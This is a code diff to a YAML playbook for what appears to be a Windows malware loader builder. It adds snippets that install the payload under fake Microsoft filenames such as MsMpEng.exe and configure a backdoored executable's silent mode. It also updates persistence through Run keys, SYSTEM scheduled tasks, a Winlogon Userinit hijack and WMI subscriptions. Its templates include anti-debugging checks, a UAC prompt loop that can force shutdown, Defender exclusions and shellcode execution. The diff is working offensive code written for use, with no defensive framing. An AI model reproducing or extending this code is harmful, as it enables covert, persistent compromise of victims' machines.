@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=./playbook.schema.json
 sections:
 - header: Anti Emulation
   template: antiemulation
@@ -1821,13 +1822,9 @@ sections:
       // UAC bypass snippet so wash_is_elevated() returns TRUE before reaching
       // this point.
       {
-          // Self-track: ensure our current path is in wash_copies[] in case no
-          // persistence snippet ran first.
-          {
-              WCHAR _self[MAX_PATH] = {0};
-              if (GetModuleFileNameW(NULL, _self, MAX_PATH) > 0)
-                  wash_track(_self);
-          }
+          // Self-track: ensure the installed payload path is in wash_copies[] so
+          // Defender exclusion covers it even if no persistence snippet ran.
+          wash_track(wash_payload_path());
 
           for (int _i = 0; _i < wash_copies_count; _i++) {
               WCHAR _ev_cmd[1024] = {0};
@@ -1900,6 +1897,179 @@ sections:
           "\x6C\x64\x00\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73"
           "\x00";
       unsigned int code_blob_len = 162;
+- header: Installation
+  template: installation
+  display: Installation
+  allowMultiple: false
+  items:
+  - id: None
+    display: None (Run In-Place)
+    default: true
+    requires: []
+    snippet: |
+      // No installation — persistence will be tied to the current launch path.
+
+  - id: AppDataDir
+    display: APPDATA Install Directory (User-Level)
+    default: false
+    requires: []
+    inputs:
+    - id: appdata_install_dir
+      label: "Sub-directory under %APPDATA%"
+      type: textbox
+      defaultValue: "Microsoft\\EdgeUpdate"
+      placeholder: "Microsoft\\EdgeUpdate"
+    - id: appdata_install_file
+      label: "Installed Filename"
+      type: textbox
+      defaultValue: "MicrosoftEdgeUpdate.exe"
+      placeholder: "MicrosoftEdgeUpdate.exe"
+    snippet: |
+      // Installation: Copy payload to %APPDATA%\<dir>\<file>.
+      // Creates the directory tree if it does not exist.
+      // If already running from the install path, skips copy and relaunch.
+      // Otherwise copies itself there, launches the installed copy, and exits —
+      // so all subsequent snippets (persistence, evasion) run from the stable path.
+      {
+          WCHAR _inst_src[MAX_PATH] = {0};
+          WCHAR _inst_dir[MAX_PATH] = {0};
+          WCHAR _inst_dst[MAX_PATH] = {0};
+          wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
+          ExpandEnvironmentStringsW(L"%APPDATA%\\$appdata_install_dir$", _inst_dir, MAX_PATH);
+          SHCreateDirectoryExW(NULL, _inst_dir, NULL);
+          wsprintfW(_inst_dst, L"%s\\$appdata_install_file$", _inst_dir);
+          if (_wcsicmp(_inst_src, _inst_dst) != 0) {
+              if (CopyFileW(_inst_src, _inst_dst, FALSE)) {
+                  STARTUPINFOW        _inst_si = {sizeof(_inst_si)};
+                  PROCESS_INFORMATION _inst_pi = {0};
+                  if (CreateProcessW(_inst_dst, NULL, NULL, NULL, FALSE,
+                                     0, NULL, NULL, &_inst_si, &_inst_pi)) {
+                      CloseHandle(_inst_pi.hProcess);
+                      CloseHandle(_inst_pi.hThread);
+                  }
+                  ExitProcess(0);
+              }
+          }
+          wcscpy_s(wash_install_path, MAX_PATH, _inst_dst);
+          wash_track(wash_install_path);
+      }
+
+  - id: LocalAppDataDir
+    display: LOCALAPPDATA Install Directory (User-Level)
+    default: false
+    requires: []
+    inputs:
+    - id: localappdata_install_dir
+      label: "Sub-directory under %LOCALAPPDATA%"
+      type: textbox
+      defaultValue: "Microsoft\\OneDrive"
+      placeholder: "Microsoft\\OneDrive"
+    - id: localappdata_install_file
+      label: "Installed Filename"
+      type: textbox
+      defaultValue: "OneDriveStandaloneUpdater.exe"
+      placeholder: "OneDriveStandaloneUpdater.exe"
+    snippet: |
+      // Installation: Copy payload to %LOCALAPPDATA%\<dir>\<file>.
+      // No administrator rights required.
+      {
+          WCHAR _inst_src[MAX_PATH] = {0};
+          WCHAR _inst_dir[MAX_PATH] = {0};
+          WCHAR _inst_dst[MAX_PATH] = {0};
+          wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
+          ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\$localappdata_install_dir$", _inst_dir, MAX_PATH);
+          SHCreateDirectoryExW(NULL, _inst_dir, NULL);
+          wsprintfW(_inst_dst, L"%s\\$localappdata_install_file$", _inst_dir);
+          if (_wcsicmp(_inst_src, _inst_dst) != 0) {
+              if (CopyFileW(_inst_src, _inst_dst, FALSE)) {
+                  STARTUPINFOW        _inst_si = {sizeof(_inst_si)};
+                  PROCESS_INFORMATION _inst_pi = {0};
+                  if (CreateProcessW(_inst_dst, NULL, NULL, NULL, FALSE,
+                                     0, NULL, NULL, &_inst_si, &_inst_pi)) {
+                      CloseHandle(_inst_pi.hProcess);
+                      CloseHandle(_inst_pi.hThread);
+                  }
+                  ExitProcess(0);
+              }
+          }
+          wcscpy_s(wash_install_path, MAX_PATH, _inst_dst);
+          wash_track(wash_install_path);
+      }
+
+  - id: ProgramDataDir
+    display: ProgramData Install Directory (Requires Admin)
+    default: false
+    requires:
+    - uac_bypass
+    inputs:
+    - id: programdata_install_dir
+      label: "Sub-directory under %ProgramData%"
+      type: textbox
+      defaultValue: "Microsoft\\Windows Defender\\Platform"
+      placeholder: "Microsoft\\Windows Defender\\Platform"
+    - id: programdata_install_file
+      label: "Installed Filename"
+      type: textbox
+      defaultValue: "MsMpEng.exe"
+      placeholder: "MsMpEng.exe"
+    snippet: |
+      // Installation: Copy payload to %ProgramData%\<dir>\<file>.
+      // Requires administrator rights — use a UAC bypass snippet before this.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _inst_src[MAX_PATH] = {0};
+          WCHAR _inst_dir[MAX_PATH] = {0};
+          WCHAR _inst_dst[MAX_PATH] = {0};
+          wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
+          ExpandEnvironmentStringsW(L"%ProgramData%\\$programdata_install_dir$", _inst_dir, MAX_PATH);
+          SHCreateDirectoryExW(NULL, _inst_dir, NULL);
+          wsprintfW(_inst_dst, L"%s\\$programdata_install_file$", _inst_dir);
+          if (_wcsicmp(_inst_src, _inst_dst) != 0) {
+              if (CopyFileW(_inst_src, _inst_dst, FALSE)) {
+                  STARTUPINFOW        _inst_si = {sizeof(_inst_si)};
+                  PROCESS_INFORMATION _inst_pi = {0};
+                  if (CreateProcessW(_inst_dst, NULL, NULL, NULL, FALSE,
+                                     0, NULL, NULL, &_inst_si, &_inst_pi)) {
+                      CloseHandle(_inst_pi.hProcess);
+                      CloseHandle(_inst_pi.hThread);
+                  }
+                  ExitProcess(0);
+              }
+          }
+          wcscpy_s(wash_install_path, MAX_PATH, _inst_dst);
+          wash_track(wash_install_path);
+      }
+
+- header: Backdoor Config
+  template: backdoorconfig
+  display: Backdoor Config
+  allowMultiple: false
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    requires: []
+    snippet: |
+      // No backdoor config — wash_silence_arg is empty; persistence registers the plain path.
+
+  - id: SilenceArg
+    display: Silence Argument (for Silence backdoor mode)
+    default: false
+    requires: []
+    inputs:
+    - id: silence_arg_value
+      label: "Silence Mode Argument"
+      type: textbox
+      defaultValue: "/s"
+      placeholder: "/s"
+    snippet: |
+      // Backdoor Config: Silence Argument
+      // Sets wash_silence_arg so persistence snippets register the payload command with
+      // this argument suffix. When the backdoored PE detects this argument at runtime it
+      // takes the silent execution path (implant runs, host UI is suppressed).
+      // Must match the -Mode silence configuration of the washmachine backdoor command.
+      wcscpy_s(wash_silence_arg, 256, L"$silence_arg_value$");
+
 - header: Persistence
   template: persistence
   display: Persistence
@@ -1924,14 +2094,16 @@ sections:
       placeholder: "WindowsUpdate"
     snippet: |
       // Persistence: HKCU Run Registry Key
-      // Adds current executable to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
+      // Adds the installed payload command to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
+      // wash_payload_cmd() returns the Installation-category path with any silence arg appended,
+      // falling back to wash_payload_path() when no silence arg is configured.
       // Starts automatically on every user logon. No administrator rights required.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
-          WCHAR _pers_path[MAX_PATH] = {0};
+          WCHAR _pers_path[MAX_PATH + 256] = {0};
           HKEY  _pers_hKey;
-          GetModuleFileNameW(NULL, _pers_path, MAX_PATH);
-          wash_track(_pers_path);
+          wcscpy_s(_pers_path, MAX_PATH + 256, wash_payload_cmd());
+          wash_track(wash_payload_path());
           if (RegOpenKeyExW(HKEY_CURRENT_USER,
                             L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
@@ -1954,7 +2126,9 @@ sections:
       placeholder: "svchost.exe"
     snippet: |
       // Persistence: User Startup Folder
-      // Copies the running executable into the current user's Startup folder.
+      // Copies the installed payload (wash_payload_path()) into the current user's
+      // Startup folder. wash_payload_path() returns the Installation-category path
+      // when set, otherwise the current module path (run-in-place mode).
       // Launched on every logon. No administrator rights required.
       // Registers the dropped path in wash_copies[] so subsequent evasion steps
       // (e.g. Defender exclusions) can apply to every dropped copy.
@@ -1963,7 +2137,7 @@ sections:
           WCHAR _sf_src[MAX_PATH] = {0};
           WCHAR _sf_dir[MAX_PATH] = {0};
           WCHAR _sf_dst[MAX_PATH] = {0};
-          GetModuleFileNameW(NULL, _sf_src, MAX_PATH);
+          wcscpy_s(_sf_src, MAX_PATH, wash_payload_path());
           ExpandEnvironmentStringsW(
               L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
               _sf_dir, MAX_PATH);
@@ -1985,7 +2159,12 @@ sections:
       placeholder: "MicrosoftEdgeUpdateTask"
     snippet: |
       // Persistence: Scheduled Task via schtasks.exe
-      // Creates a logon-triggered task that runs the current executable silently.
+      // Creates a logon-triggered task that runs the installed payload silently.
+      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // falls back to the current module path (run-in-place mode).
+      // When wash_silence_arg is set (BackdoorConfig/SilenceArg snippet), the task's
+      // /TR value includes the silence argument so the backdoored host takes the silent
+      // execution path on every scheduled launch.
       // Uses /RL LIMITED (no UAC prompt required). Overwrites existing task with /F.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
@@ -1993,12 +2172,19 @@ sections:
           WCHAR _st_cmd[1024]          = {0};
           STARTUPINFOW        _st_si   = {sizeof(_st_si)};
           PROCESS_INFORMATION _st_pi   = {0};
-          GetModuleFileNameW(NULL, _st_exe, MAX_PATH);
+          wcscpy_s(_st_exe, MAX_PATH, wash_payload_path());
           wash_track(_st_exe);
-          wsprintfW(_st_cmd,
-                    L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
-                    L"/TR \"\\\"%s\\\"\" /SC ONLOGON /RL LIMITED /F",
-                    _st_exe);
+          if (wash_silence_arg[0] != L'\0') {
+              wsprintfW(_st_cmd,
+                        L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
+                        L"/TR \"\\\"%s\\\" %s\" /SC ONLOGON /RL LIMITED /F",
+                        _st_exe, wash_silence_arg);
+          } else {
+              wsprintfW(_st_cmd,
+                        L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
+                        L"/TR \"\\\"%s\\\"\" /SC ONLOGON /RL LIMITED /F",
+                        _st_exe);
+          }
           _st_si.dwFlags     = STARTF_USESHOWWINDOW;
           _st_si.wShowWindow = SW_HIDE;
           if (CreateProcessW(NULL, _st_cmd, NULL, NULL, FALSE,
@@ -2022,19 +2208,19 @@ sections:
       placeholder: "WindowsDefenderUpdate"
     snippet: |
       // Persistence: HKLM Run Registry Key
-      // Adds current executable to HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
+      // Adds the installed payload command to HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
+      // wash_payload_cmd() returns the Installation-category path with any silence arg appended,
+      // falling back to wash_payload_path() when no silence arg is configured.
       // Runs at logon for ALL users. Requires administrator rights to write.
-      // Spams a UAC prompt loop until elevation is granted (or the configured
-      // denial threshold force-shutdowns the system) before touching HKLM.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
           // Loop UAC prompt until the user accepts. 0 = forever, 300ms retry.
           wash_demand_elevation_or_shutdown(0, 300);
 
-          WCHAR _pers_path[MAX_PATH] = {0};
+          WCHAR _pers_path[MAX_PATH + 256] = {0};
           HKEY  _pers_hKey;
-          GetModuleFileNameW(NULL, _pers_path, MAX_PATH);
-          wash_track(_pers_path);
+          wcscpy_s(_pers_path, MAX_PATH + 256, wash_payload_cmd());
+          wash_track(wash_payload_path());
           if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                             L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
@@ -2057,8 +2243,10 @@ sections:
       placeholder: "msedge_update.exe"
     snippet: |
       // Persistence: HKCU UserInitMprLogonScript Logon Script
-      // Copies the running executable to %APPDATA%\Microsoft\Windows\ and registers
+      // Copies the installed payload to %APPDATA%\Microsoft\Windows\ and registers
       // it as the user's logon script via HKCU\Environment\UserInitMprLogonScript.
+      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // falls back to the current module path (run-in-place mode).
       // winlogon.exe invokes every path in this value at each interactive logon via
       // the Multi-Provider Router (MPR). No administrator rights required.
       // Very low AV/EDR signature rate. Survives reboots and user re-logons.
@@ -2068,7 +2256,7 @@ sections:
           WCHAR _ls_dir[MAX_PATH] = {0};
           WCHAR _ls_dst[MAX_PATH] = {0};
           HKEY  _ls_hKey;
-          GetModuleFileNameW(NULL, _ls_src, MAX_PATH);
+          wcscpy_s(_ls_src, MAX_PATH, wash_payload_path());
           ExpandEnvironmentStringsW(L"%APPDATA%\\Microsoft\\Windows", _ls_dir, MAX_PATH);
           wsprintfW(_ls_dst, L"%s\\$logon_script_file_name$", _ls_dir);
           if (!CopyFileW(_ls_src, _ls_dst, FALSE))
@@ -2097,8 +2285,10 @@ sections:
       placeholder: "RuntimeBrokerHelper.exe"
     snippet: |
       // Persistence: All-Users Startup Folder
-      // Copies the running executable into
+      // Copies the installed payload into
       // %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup.
+      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // falls back to the current module path (run-in-place mode).
       // Launched automatically at every logon for ANY user on the system.
       // Requires administrator rights. No Task Scheduler entry is created.
       // Compatible with Windows 10/11 and Windows Server 2016+.
@@ -2107,7 +2297,7 @@ sections:
           WCHAR _aus_src[MAX_PATH] = {0};
           WCHAR _aus_dir[MAX_PATH] = {0};
           WCHAR _aus_dst[MAX_PATH] = {0};
-          GetModuleFileNameW(NULL, _aus_src, MAX_PATH);
+          wcscpy_s(_aus_src, MAX_PATH, wash_payload_path());
           ExpandEnvironmentStringsW(
               L"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
               _aus_dir, MAX_PATH);
@@ -2137,7 +2327,12 @@ sections:
       // Creates a task that fires at every system startup (/SC ONSTART) running as
       // SYSTEM with highest privilege (/RU SYSTEM /RL HIGHEST). Unlike ONLOGON tasks
       // this executes before any interactive session exists — ideal for network-facing
-      // payloads and C2 beacons. Requires administrator rights.
+      // payloads and C2 beacons. wash_payload_path() returns the Installation-category
+      // path when set, otherwise falls back to the current module path (run-in-place).
+      // When wash_silence_arg is set (BackdoorConfig/SilenceArg snippet), the task's
+      // /TR value includes the silence argument so the backdoored host takes the silent
+      // execution path on every scheduled launch.
+      // Requires administrator rights.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
           wash_demand_elevation_or_shutdown(0, 300);
@@ -2145,12 +2340,19 @@ sections:
           WCHAR _ss_cmd[1024]     = {0};
           STARTUPINFOW        _ss_si = {sizeof(_ss_si)};
           PROCESS_INFORMATION _ss_pi = {0};
-          GetModuleFileNameW(NULL, _ss_exe, MAX_PATH);
+          wcscpy_s(_ss_exe, MAX_PATH, wash_payload_path());
           wash_track(_ss_exe);
-          wsprintfW(_ss_cmd,
-                    L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
-                    L"/TR \"\\\"%s\\\"\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /DELAY $sched_startup_delay$",
-                    _ss_exe);
+          if (wash_silence_arg[0] != L'\0') {
+              wsprintfW(_ss_cmd,
+                        L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
+                        L"/TR \"\\\"%s\\\" %s\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /DELAY $sched_startup_delay$",
+                        _ss_exe, wash_silence_arg);
+          } else {
+              wsprintfW(_ss_cmd,
+                        L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
+                        L"/TR \"\\\"%s\\\"\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /DELAY $sched_startup_delay$",
+                        _ss_exe);
+          }
           _ss_si.dwFlags     = STARTF_USESHOWWINDOW;
           _ss_si.wShowWindow = SW_HIDE;
           if (CreateProcessW(NULL, _ss_cmd, NULL, NULL, FALSE,
@@ -2168,20 +2370,24 @@ sections:
     - uac_bypass
     snippet: |
       // Persistence: Winlogon Userinit Registry Hijack
-      // Appends the running executable path to the comma-separated Userinit value at
+      // Appends the installed payload command to the comma-separated Userinit value at
       // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.
+      // wash_payload_cmd() returns the path with any silence arg so that the backdoored
+      // host takes the silent execution path on every Winlogon-triggered launch.
       // winlogon.exe launches every comma-separated entry at each interactive logon.
       // The default value is "C:\Windows\system32\userinit.exe," — we append after it.
-      // Idempotent: skips the write if the path is already present in the value.
+      // Idempotent: skips the write if the raw path is already present in the value.
       // Requires administrator rights.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
           wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _wu_cmd[MAX_PATH + 256]      = {0};
           WCHAR _wu_path[MAX_PATH]           = {0};
           WCHAR _wu_cur[1024]                = {0};
-          WCHAR _wu_new[1024 + MAX_PATH + 2] = {0};
+          WCHAR _wu_new[1024 + MAX_PATH + 258] = {0};
           HKEY  _wu_hKey;
-          GetModuleFileNameW(NULL, _wu_path, MAX_PATH);
+          wcscpy_s(_wu_path, MAX_PATH, wash_payload_path());
+          wcscpy_s(_wu_cmd, MAX_PATH + 256, wash_payload_cmd());
           wash_track(_wu_path);
           if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                             L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
@@ -2194,7 +2400,7 @@ sections:
                   size_t _wu_len = wcslen(_wu_cur);
                   if (_wu_len > 0 && _wu_cur[_wu_len - 1] != L',')
                       wcscat_s(_wu_cur, 1024, L",");
-                  wsprintfW(_wu_new, L"%s%s,", _wu_cur, _wu_path);
+                  wsprintfW(_wu_new, L"%s%s,", _wu_cur, _wu_cmd);
                   RegSetValueExW(_wu_hKey, L"Userinit", 0, REG_SZ,
                                  (BYTE*)_wu_new,
                                  (DWORD)((wcslen(_wu_new) + 1) * sizeof(WCHAR)));
@@ -2227,6 +2433,8 @@ sections:
       //   __FilterToConsumerBinding — links the two objects
       // Entries live in the WMI repository, not in the registry or Task Scheduler.
       // Survives reboots; SYSTEM-level execution context. Requires administrator rights.
+      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // falls back to the current module path (run-in-place mode).
       // Implemented via a UTF-16LE PS1 temp file to avoid COM ceremony in C++.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
@@ -2238,7 +2446,7 @@ sections:
           WCHAR _wm_scr[2048]           = {0};
           STARTUPINFOW        _wm_si = {sizeof(_wm_si)};
           PROCESS_INFORMATION _wm_pi = {0};
-          GetModuleFileNameW(NULL, _wm_exe, MAX_PATH);
+          wcscpy_s(_wm_exe, MAX_PATH, wash_payload_path());
           wash_track(_wm_exe);
           GetTempPathW(MAX_PATH, _wm_tmp_base);
           wsprintfW(_wm_tmp, L"%swusa_svc.ps1", _wm_tmp_base);
@@ -2329,6 +2537,10 @@ templates:
 
         {{UAC_BYPASS}}
 
+        {{INSTALLATION}}
+
+        {{BACKDOOR_CONFIG}}
+
         {{PERSISTENCE}}
 
         {{EVASION}}
@@ -2367,6 +2579,12 @@ templates:
   - name: UAC_BYPASS
     kind: snippet
     snippetTemplate: uacb
+  - name: INSTALLATION
+    kind: snippet
+    snippetTemplate: installation
+  - name: BACKDOOR_CONFIG
+    kind: snippet
+    snippetTemplate: backdoorconfig
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
@@ -2382,7 +2600,7 @@ templates:
 - id: paranoid
   display: Paranoid Loader
   description: Every protection enabled - layered defense in depth.
-  content: "#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <winternl.h>\n#include <intrin.h>\n#include <tlhelp32.h>\n#include <shlobj.h>\n#include <iphlpapi.h>\n#include <lm.h>\n#pragma comment(lib, \"iphlpapi.lib\")\n#pragma comment(lib, \"netapi32.lib\")\n\n{{PREAMBLE}}\n\n{{PROCESS_LOOKUP_HELPER}}\n\n// Watchdog thread\nvolatile BOOL g_SafeToRun = TRUE;\n\nDWORD WINAPI WatchdogThread(LPVOID lpParam) {\n    while (g_SafeToRun) {\n        // Check debugger continuously\n        if (IsDebuggerPresent()) { g_SafeToRun = FALSE; ExitProcess(0); }\n        \n        // Check hardware breakpoints\n        CONTEXT ctx = {0};\n        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n        if (GetThreadContext(GetCurrentThread(), &ctx)) {\n            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { g_SafeToRun = FALSE; ExitProcess(0); }\n        }\n        \n        // Check for analysis tools\n        const wchar_t* tools[] = {\n            L\"x64dbg.exe\", L\"ida.exe\", L\"idaq64.exe\", L\"procmon.exe\",\n            L\"wireshark.exe\", L\"fiddler.exe\", L\"ProcessHacker.exe\"\n        };\n        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n        if (snap != INVALID_HANDLE_VALUE) {\n            PROCESSENTRY32W pe = {sizeof(pe)};\n            if (Process32FirstW(snap, &pe)) {\n                do {\n                    for (int i = 0; i < 7; i++) {\n                        if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {\n                            CloseHandle(snap);\n                            g_SafeToRun = FALSE;\n                            ExitProcess(0);\n                        }\n                    }\n                } while (Process32NextW(snap, &pe));\n            }\n            CloseHandle(snap);\n        }\n        \n        Sleep(500);\n    }\n    return 0;\n}\n\nINT main(VOID)\n{\n    // Start watchdog\n    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);\n\n    // Phase 1: Anti-Emulation\n    {{ANTI_EMULATION}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 2: Environment Validation\n    {{GUARDRAILS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 3: VM/Sandbox Detection\n    {{ANTI_SANDBOX}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 4: Anti-Debugging\n    {{ANTI_DEBUGGING}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 5: Anti-Analysis\n    {{ANTI_ANALYSIS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 6: UAC bypass\n    {{UAC_BYPASS}}\n\n    // Phase 7: Persistence\n    {{PERSISTENCE}}\n\n    // Phase 8: Evasion (Defender exclusions, etc.)\n    {{EVASION}}\n\n    // Phase 9: Load Payload\n    {{SHELLCODE_SOURCE}}\n    {{SHELLCODE_URL}}\n\n    // Phase 10: Execute\n    {{SHELLCODE_EXECUTION}}\n\n    return 0;\n}\n"
+  content: "#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <winternl.h>\n#include <intrin.h>\n#include <tlhelp32.h>\n#include <shlobj.h>\n#include <iphlpapi.h>\n#include <lm.h>\n#pragma comment(lib, \"iphlpapi.lib\")\n#pragma comment(lib, \"netapi32.lib\")\n\n{{PREAMBLE}}\n\n{{PROCESS_LOOKUP_HELPER}}\n\n// Watchdog thread\nvolatile BOOL g_SafeToRun = TRUE;\n\nDWORD WINAPI WatchdogThread(LPVOID lpParam) {\n    while (g_SafeToRun) {\n        // Check debugger continuously\n        if (IsDebuggerPresent()) { g_SafeToRun = FALSE; ExitProcess(0); }\n        \n        // Check hardware breakpoints\n        CONTEXT ctx = {0};\n        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n        if (GetThreadContext(GetCurrentThread(), &ctx)) {\n            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { g_SafeToRun = FALSE; ExitProcess(0); }\n        }\n        \n        // Check for analysis tools\n        const wchar_t* tools[] = {\n            L\"x64dbg.exe\", L\"ida.exe\", L\"idaq64.exe\", L\"procmon.exe\",\n            L\"wireshark.exe\", L\"fiddler.exe\", L\"ProcessHacker.exe\"\n        };\n        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n        if (snap != INVALID_HANDLE_VALUE) {\n            PROCESSENTRY32W pe = {sizeof(pe)};\n            if (Process32FirstW(snap, &pe)) {\n                do {\n                    for (int i = 0; i < 7; i++) {\n                        if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {\n                            CloseHandle(snap);\n                            g_SafeToRun = FALSE;\n                            ExitProcess(0);\n                        }\n                    }\n                } while (Process32NextW(snap, &pe));\n            }\n            CloseHandle(snap);\n        }\n        \n        Sleep(500);\n    }\n    return 0;\n}\n\nINT main(VOID)\n{\n    // Start watchdog\n    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);\n\n    // Phase 1: Anti-Emulation\n    {{ANTI_EMULATION}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 2: Environment Validation\n    {{GUARDRAILS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 3: VM/Sandbox Detection\n    {{ANTI_SANDBOX}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 4: Anti-Debugging\n    {{ANTI_DEBUGGING}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 5: Anti-Analysis\n    {{ANTI_ANALYSIS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 6: UAC bypass\n    {{UAC_BYPASS}}\n\n    // Phase 6b: Installation\n    {{INSTALLATION}}\n\n    // Phase 6c: Backdoor Config\n    {{BACKDOOR_CONFIG}}\n\n    // Phase 7: Persistence\n    {{PERSISTENCE}}\n\n    // Phase 8: Evasion (Defender exclusions, etc.)\n    {{EVASION}}\n\n    // Phase 9: Load Payload\n    {{SHELLCODE_SOURCE}}\n    {{SHELLCODE_URL}}\n\n    // Phase 10: Execute\n    {{SHELLCODE_EXECUTION}}\n\n    return 0;\n}\n"
   placeholders:
   - name: PREAMBLE
     kind: system
@@ -2406,6 +2624,12 @@ templates:
   - name: UAC_BYPASS
     kind: snippet
     snippetTemplate: uacb
+  - name: INSTALLATION
+    kind: snippet
+    snippetTemplate: installation
+  - name: BACKDOOR_CONFIG
+    kind: snippet
+    snippetTemplate: backdoorconfig
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
@@ -2477,6 +2701,8 @@ templates:
         {{ANTI_ANALYSIS}}
         {{ANTI_DEBUGGING}}
         {{UAC_BYPASS}}
+        {{INSTALLATION}}
+        {{BACKDOOR_CONFIG}}
         {{PERSISTENCE}}
         {{EVASION}}
         {{SHELLCODE_SOURCE}}
@@ -2501,6 +2727,12 @@ templates:
   - name: UAC_BYPASS
     kind: snippet
     snippetTemplate: uacb
+  - name: INSTALLATION
+    kind: snippet
+    snippetTemplate: installation
+  - name: BACKDOOR_CONFIG
+    kind: snippet
+    snippetTemplate: backdoorconfig
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
@@ -2552,10 +2784,16 @@ templates:
         // Layer 5: UAC bypass
         {{UAC_BYPASS}}
 
-        // Layer 6: Persistence
+        // Layer 6: Installation
+        {{INSTALLATION}}
+
+        // Layer 6b: Backdoor Config
+        {{BACKDOOR_CONFIG}}
+
+        // Layer 7: Persistence
         {{PERSISTENCE}}
 
-        // Layer 7: Evasion (Defender exclusions, etc.)
+        // Layer 8: Evasion (Defender exclusions, etc.)
         {{EVASION}}
 
         // Layer 8: Payload
@@ -2587,6 +2825,12 @@ templates:
   - name: UAC_BYPASS
     kind: snippet
     snippetTemplate: uacb
+  - name: INSTALLATION
+    kind: snippet
+    snippetTemplate: installation
+  - name: BACKDOOR_CONFIG
+    kind: snippet
+    snippetTemplate: backdoorconfig
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
@@ -2614,6 +2858,10 @@ templates:
     {
         {{SHELLCODE_SOURCE}}
 
+        {{INSTALLATION}}
+
+        {{BACKDOOR_CONFIG}}
+
         {{PERSISTENCE}}
 
         {{SHELLCODE_EXECUTION}}
@@ -2626,6 +2874,12 @@ templates:
     kind: system
   - name: SHELLCODE_SOURCE
     kind: system
+  - name: INSTALLATION
+    kind: snippet
+    snippetTemplate: installation
+  - name: BACKDOOR_CONFIG
+    kind: snippet
+    snippetTemplate: backdoorconfig
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
@@ -2646,6 +2900,10 @@ templates:
 
     INT ExecutePayload()
     {
+        {{INSTALLATION}}
+
+        {{BACKDOOR_CONFIG}}
+
         {{PERSISTENCE}}
 
         {{SHELLCODE_EXECUTION}}
@@ -2665,6 +2923,12 @@ templates:
     kind: system
   - name: SHELLCODE_SOURCE
     kind: system
+  - name: INSTALLATION
+    kind: snippet
+    snippetTemplate: installation
+  - name: BACKDOOR_CONFIG
+    kind: snippet
+    snippetTemplate: backdoorconfig
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
@@ -2689,6 +2953,10 @@ templates:
     {
         {{SHELLCODE_SOURCE}}
 
+        {{INSTALLATION}}
+
+        {{BACKDOOR_CONFIG}}
+
         {{PERSISTENCE}}
 
         {{SHELLCODE_EXECUTION}}
@@ -2700,6 +2968,12 @@ templates:
     kind: system
   - name: SHELLCODE_SOURCE
